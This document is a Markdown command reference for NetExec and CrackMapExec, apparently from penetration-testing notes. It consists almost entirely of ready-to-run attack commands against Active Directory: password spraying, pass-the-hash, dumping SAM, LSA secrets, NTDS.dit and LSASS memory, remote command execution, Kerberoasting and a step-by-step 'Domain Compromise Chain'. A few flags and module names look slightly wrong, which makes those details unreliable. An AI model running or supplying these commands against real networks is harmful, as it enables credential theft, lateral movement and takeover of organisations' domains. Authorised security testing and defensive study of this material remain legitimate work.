# <span style="color:rgb(255, 192, 0)">NetExec (nxc) & CrackMapExec - Complete Command Reference</span>

**NetExec** (nxc) is the successor to CrackMapExec (cme). It is a swiss-army knife for Active Directory exploitation with modules for SMB, LDAP, WinRM, RDP, MSSQL, SSH, and more.

**Installation:**
```bash
# NetExec
pip install netexec

# Or from source
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
pip install .

# CrackMapExec (legacy)
pip install crackmapexec
```

**Auth syntax:** `-u user -p pass` or `-u user -H NTLM` or `-u user -K ticket.ccache`

---

## <span style="color:rgb(255, 0, 0)">1. SMB Module (nxc smb)</span>

### Basic Scanning & Enumeration

```bash
# Test credentials against subnet
nxc smb 192.168.1.0/24 -u Administrator -p Password123

# Null session (anonymous)
nxc smb 192.168.1.100 -u '' -p ''

# Guest account
nxc smb 192.168.1.100 -u 'guest' -p ''

# Single target
nxc smb target.domain.local -u user -p pass

# Targets from file
nxc smb targets.txt -u user -p pass

# Username/Password from file (spraying)
nxc smb 192.168.1.100 -u users.txt -p Password123 --continue-on-success

# Password spraying
nxc smb 192.168.1.100 -u users.txt -p Summer2026 --no-bruteforce

# Multi-password spray (each user tried against each password)
nxc smb 192.168.1.100 -u users.txt -p passwords.txt
```

### Pass-the-Hash

```bash
# NTLM hash auth
nxc smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:NT_HASH

# Omit LM hash
nxc smb 192.168.1.100 -u Administrator -H :NT_HASH

# Local auth (not domain)
nxc smb 192.168.1.100 -u Administrator -H :NT_HASH --local-auth
```

### Domain Enumeration

```bash
# Enumerate users
nxc smb 192.168.1.100 -u user -p pass --users

# Enumerate groups
nxc smb 192.168.1.100 -u user -p pass --groups

# Enumerate shares
nxc smb 192.168.1.100 -u user -p pass --shares

# Enumerate logged-on users
nxc smb 192.168.1.100 -u user -p pass --loggedon-users

# Enumerate disks
nxc smb 192.168.1.100 -u user -p pass --disks

# Enumerate local groups
nxc smb 192.168.1.100 -u user -p pass --local-groups

# Enumerate computers (domain joined)
nxc smb 192.168.1.100 -u user -p pass --computers

# All in one
nxc smb 192.168.1.100 -u user -p pass --users --groups --shares --loggedon-users
```

### Dumping Credentials

```bash
# Dump SAM (local accounts)
nxc smb 192.168.1.100 -u Administrator -p pass --sam

# Dump LSA secrets
nxc smb 192.168.1.100 -u Administrator -p pass --lsa

# Dump NTDS.dit (requires admin on DC)
nxc smb dc01.domain.local -u Administrator -p pass --ntds

# Dump NTDS with specific format
nxc smb dc01.domain.local -u Administrator -p pass --ntds --users --enabled

# Dump NTDS with history
nxc smb dc01.domain.local -u Administrator -p pass --ntds-history

# Dump NTDS via vss (shadow copy)
nxc smb dc01.domain.local -u Administrator -p pass --ntds vss

# Dump NTDS to local file
nxc smb dc01.domain.local -u Administrator -p pass --ntds --outputfile ntds_dump
```

### Command Execution

```bash
# Execute command via SMB
nxc smb 192.168.1.100 -u Administrator -p pass -x whoami

# Execute via PowerShell
nxc smb 192.168.1.100 -u Administrator -p pass -X whoami

# Upload and execute file
nxc smb 192.168.1.100 -u Administrator -p pass --exec-method smbexec -x whoami

# With pass-the-hash
nxc smb 192.168.1.100 -u Administrator -H :NTLM -x whoami

# Execute on multiple targets
nxc smb 192.168.1.0/24 -u Administrator -H :NTLM -x whoami
```

### Modules (SMB)

```bash
# GPP password enumeration (scans SYSVOL)
nxc smb 192.168.1.100 -u user -p pass -M gpp_password

# Spider shares (recursive file search)
nxc smb 192.168.1.100 -u user -p pass -M spider_plus -o DOWNLOAD=true
nxc smb 192.168.1.100 -u user -p pass -M spider_plus -o STATS=true
nxc smb 192.168.1.100 -u user -p pass -M spider_plus -o EXCLUDE_DIR=IPC$,PRINT$,SYSVOL
nxc smb 192.168.1.100 -u user -p pass -M spider_plus -o PATTERN=sensitive.*\.txt

# LSASSY dump (procdump/task manager based)
nxc smb 192.168.1.100 -u Administrator -p pass -M lsassy
nxc smb 192.168.1.100 -u Administrator -p pass -M lsassy -o BLOODHOUND=true

# HandleKatz (handle.exe based LSASS dump)
nxc smb 192.168.1.100 -u Administrator -p pass -M handlekatz

# Nanodump (minimal LSASS dump)
nxc smb 192.168.1.100 -u Administrator -p pass -M nanodump

# SCCM enumeration
nxc smb 192.168.1.100 -u user -p pass -M sccm

# SLAAP (SMB coerced auth)
nxc smb 192.168.1.100 -u user -p pass -M SLAAP

# DFScoerce (coerce auth via DFS)
nxc smb 192.168.1.100 -u user -p pass -M dfscoerce

# LAPS password read
nxc smb 192.168.1.100 -u user -p pass -M laps

# WCCE (ADCS enrollment)
nxc smb 192.168.1.100 -u user -p pass -M wcce

# KeePass finder
nxc smb 192.168.1.100 -u user -p pass -M keepass_discover

# MAQ (Machine Account Quota)
nxc smb 192.168.1.100 -u user -p pass -M maq

# Enumerate Defender status
nxc smb 192.168.1.100 -u user -p pass -M defender_check

# ASREPRoast (from users file)
nxc smb 192.168.1.100 -u user -p pass -M asreproast

# Kerberoast
nxc smb 192.168.1.100 -u user -p pass -M kerberoast
```

### SMB Signing Check

```bash
# Check SMB signing (all hosts in subnet)
nxc smb 192.168.1.0/24

# SMB signing check with verbose
nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt

# Generate relay list from scan
nxc smb 192.168.1.0/24 --gen-relay-list targets_relay.txt
```

---

## <span style="color:rgb(0, 176, 240)">2. LDAP Module (nxc ldap)</span>

```bash
# Basic LDAP query
nxc ldap dc01.domain.local -u user -p pass

# Enumerate domain users (LDAP query)
nxc ldap dc01.domain.local -u user -p pass --users

# Enumerate groups
nxc ldap dc01.domain.local -u user -p pass --groups

# BloodHound data (ACE collection via LDAP)
nxc ldap dc01.domain.local -u user -p pass --bloodhound
nxc ldap dc01.domain.local -u user -p pass --bloodhound --collection All
nxc ldap dc01.domain.local -u user -p pass --bloodhound --collection Group,Session,Trusts

# Kerberoasting (query + request TGS)
nxc ldap dc01.domain.local -u user -p pass --kerberoasting
nxc ldap dc01.domain.local -u user -p pass --kerberoasting --outputfile kerberoast.txt

# AS-REP roasting
nxc ldap dc01.domain.local -u user -p pass --asreproast
nxc ldap dc01.domain.local -u user -p pass --asreproast --outputfile asrep.txt

# Query gMSA passwords
nxc ldap dc01.domain.local -u user -p pass --gmsa

# Query LAPS passwords
nxc ldap dc01.domain.local -u user -p pass --laps

# Dump domain admins group
nxc ldap dc01.domain.local -u user -p pass -M group -o GROUP="Domain Admins"

# Dump all computers with OS
nxc ldap dc01.domain.local -u user -p pass --computers

# Query ADCS objects
nxc ldap dc01.domain.local -u user -p pass -M adcs

# Query trust relationships
nxc ldap dc01.domain.local -u user -p pass -M trusts

# Subnet enumeration
nxc ldap dc01.domain.local -u user -p pass -M subnets

# List constrained/unconstrained delegation
nxc ldap dc01.domain.local -u user -p pass -M delegation

# Dump all objects for analysis
nxc ldap dc01.domain.local -u user -p pass -M all

# Query by SPN
nxc ldap dc01.domain.local -u user -p pass -M spn

# Dump description field (often contains passwords)
nxc ldap dc01.domain.local -u user -p pass -M descriptions

# Custom LDAP filter
# (Use -o ATTR=... for module-specific options)
```

**Key LDAP Modules:**

| Module | Description |
|--------|-------------|
| `adcs` | Find ADCS servers and templates |
| `group` | Enumerate group members |
| `trusts` | Enumerate domain trusts |
| `subnets` | Enumerate AD subnets |
| `delegation` | Find unconstrained/constrained delegation |
| `all` | Dump all objects |
| `spn` | List SPNs |
| `descriptions` | Dump descriptions (often passwords) |
| `gmsa` | Query gMSA accounts |

---

## <span style="color:rgb(146, 208, 80)">3. WinRM Module (nxc winrm)</span>

```bash
# Test credentials over WinRM
nxc winrm 192.168.1.100 -u user -p pass

# Execute command
nxc winrm 192.168.1.100 -u user -p pass -x whoami

# PowerShell execution
nxc winrm 192.168.1.100 -u user -p pass -X Get-Process

# Pass-the-hash (NTLM auth)
nxc winrm 192.168.1.100 -u Administrator -H :NTLM

# Pass-the-hash with local auth
nxc winrm 192.168.1.100 -u Administrator -H :NTLM --local-auth

# Execute with output
nxc winrm 192.168.1.100 -u user -p pass -X "Get-ChildItem C:\"

# Subnet sweep
nxc winrm 192.168.1.0/24 -u user -p pass

# Using Kerberos
nxc winrm dc01.domain.local -u user -p pass -k

# Check WinRM over HTTPS
nxc winrm 192.168.1.100 -u user -p pass -S

# WinRM with custom port
nxc winrm 192.168.1.100 -u user -p pass --port 5986
```

---

## <span style="color:rgb(255, 0, 0)">4. RDP Module (nxc rdp)</span>

```bash
# Check RDP access
nxc rdp 192.168.1.100 -u user -p pass

# Pass-the-hash
nxc rdp 192.168.1.100 -u Administrator -H :NTLM

# Screenshot (requires -xfreee)
nxc rdp 192.168.1.100 -u user -p pass --screenshot
nxc rdp 192.168.1.100 -u user -p pass --screenshot --screentime 5

# Check RDP signing
nxc rdp 192.168.1.100 -u user -p pass -M rdp-sec

# Brute-force RDP
nxc rdp 192.168.1.100 -u users.txt -p passwords.txt
```

---

## <span style="color:rgb(0, 176, 240)">5. MSSQL Module (nxc mssql)</span>

```bash
# Check SQL server credentials
nxc mssql 192.168.1.100 -u sa -p pass

# Execute query
nxc mssql 192.168.1.100 -u sa -p pass -q "SELECT @@version"

# Enable xp_cmdshell
nxc mssql 192.168.1.100 -u sa -p pass --enable-xp-cmdshell

# Execute command via xp_cmdshell
nxc mssql 192.168.1.100 -u sa -p pass -x whoami

# Linked SQL server enumeration
nxc mssql 192.168.1.100 -u sa -p pass -M linked

# Multi-target
nxc mssql 192.168.1.0/24 -u sa -p pass

# Hash auth (SQL auth)
nxc mssql 192.168.1.100 -u sa -H :NTLM

# Windows auth to SQL
nxc mssql 192.168.1.100 -u domain\\user -p pass --windows-auth

# Audit passwords
nxc mssql 192.168.1.100 -u sa -p pass -M audit
```

---

## <span style="color:rgb(146, 208, 80)">6. SSH Module (nxc ssh)</span>

```bash
# Check SSH credentials
nxc ssh 192.168.1.100 -u user -p pass

# Execute command
nxc ssh 192.168.1.100 -u user -p pass -x whoami

# Key-based auth
nxc ssh 192.168.1.100 -u user -p pass --key-file id_rsa

# Port change
nxc ssh 192.168.1.100 -u user -p pass --port 2222
```

---

## <span style="color:rgb(255, 0, 0)">7. Database Commands (nxcdb)</span>

NetExec stores successful authentications in a local SQLite database.

```bash
# View database
nxcdb

# Inside nxcdb shell:
# List all hosts
hosts

# List all credentials
creds

# List admin hosts only
admin-hosts

# Show credential relationships
relations

# Export data
export <format> <filename>

# Search for specific user
search user

# Filter by protocol
filter smb

# Show detailed cred
show cred <id>

# Show detailed host
show host <id>

# Clear database
clear

# Import from file
import <file>

# Help
help
```

### nxc Command-line Database Options

```bash
# Save results to database (default)
nxc smb 192.168.1.100 -u user -p pass --save

# Don't save to database
nxc smb 192.168.1.100 -u user -p pass --no-save

# Clear database
nxcdb clear

# Query database from command line
nxc smb --db <file> -u user -p pass
```

---

## <span style="color:rgb(0, 176, 240)">8. General Options & Flags</span>

```bash
# Authentication
-u USER, --username USER
-p PASS, --password PASS
-H HASH, -hashes HASH, --hash HASH
-k, --kerberos
--local-auth
--use-kcache
-aesKey KEY

# Target
-t URL --target URL
l CIDR (192.168.1.0/24)
targets.txt (file with targets)

# Execution
-x CMD --exec-command CMD
-X PS_CMD --powershell-command PS_CMD
--exec-method {smbexec,wmiexec,atexec}

# Output
-o OPTIONS --module-options OPTIONS
--output FILE
--verbose

# Protocol
--port PORT
--ssl
-s, --smbsigning
--smb-port PORT

# Performance
--threads THREADS
--timeout TIMEOUT
--delay DELAY

# Spraying
--no-bruteforce
--continue-on-success
--stop-on-spray-fail

# Misc
--bloodhound
--share SHARE
-d DOMAIN
--gfail-limit LIMIT
--jitter JITTER
```

---

## <span style="color:rgb(146, 208, 80)">9. Common Workflows</span>

### Full Domain Recon

```bash
# 1. SMB signing check (find relay targets)
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt

# 2. Test null session
nxc smb dc01 -u '' -p ''

# 3. Enumerate with creds
nxc smb dc01 -u user -p pass --users --groups --shares --loggedon-users
nxc ldap dc01 -u user -p pass --users --groups --bloodhound

# 4. Kerberoast/ASREProast
nxc ldap dc01 -u user -p pass --kerberoasting --asreproast

# 5. Check GPP
nxc smb dc01 -u user -p pass -M gpp_password

# 6. Spider shares
nxc smb dc01 -u user -p pass -M spider_plus -o DOWNLOAD=true
```

### Password Spraying

```bash
# Single password against user list
nxc smb dc01 -u users.txt -p 'Summer2026' --no-bruteforce --continue-on-success

# Multiple passwords (sequential)
nxc smb dc01 -u users.txt -p passwords.txt --continue-on-success

# With stop on success (to avoid lockout)
nxc smb dc01 -u users.txt -p 'Password123' --stop-on-spray-fail

# Via WinRM (alternative protocol)
nxc winrm dc01 -u users.txt -p 'Password123'
```

### Lateral Movement

```bash
# 1. Find admin targets
nxc smb 192.168.1.0/24 -u user -p pass -x whoami | grep "Administrator"

# 2. Dump SAM on admin targets
nxc smb 192.168.1.100 -u Administrator -H :NTLM --sam --lsa

# 3. Dump LSASS with lsassy
nxc smb 192.168.1.100 -u Administrator -H :NTLM -M lsassy

# 4. Execute commands
nxc smb 192.168.1.100 -u Administrator -H :NTLM -X "Get-ChildItem C:\Users\"
```

### Domain Compromise Chain

```bash
# After obtaining initial creds:
nxc smb dc01 -u user -p pass --shares
nxc smb dc01 -u user -p pass --users --groups
nxc ldap dc01 -u user -p pass --bloodhound
nxc smb dc01 -u user -p pass -M spider_plus
nxc ldap dc01 -u user -p pass --kerberoasting

# Once DA obtained:
nxc smb dc01 -u Administrator -H :NTLM --ntds
nxc smb all_hosts.txt -u Administrator -H :NTLM --sam --lsa
nxc smb all_hosts.txt -u Administrator -H :NTLM -M lsassy
```
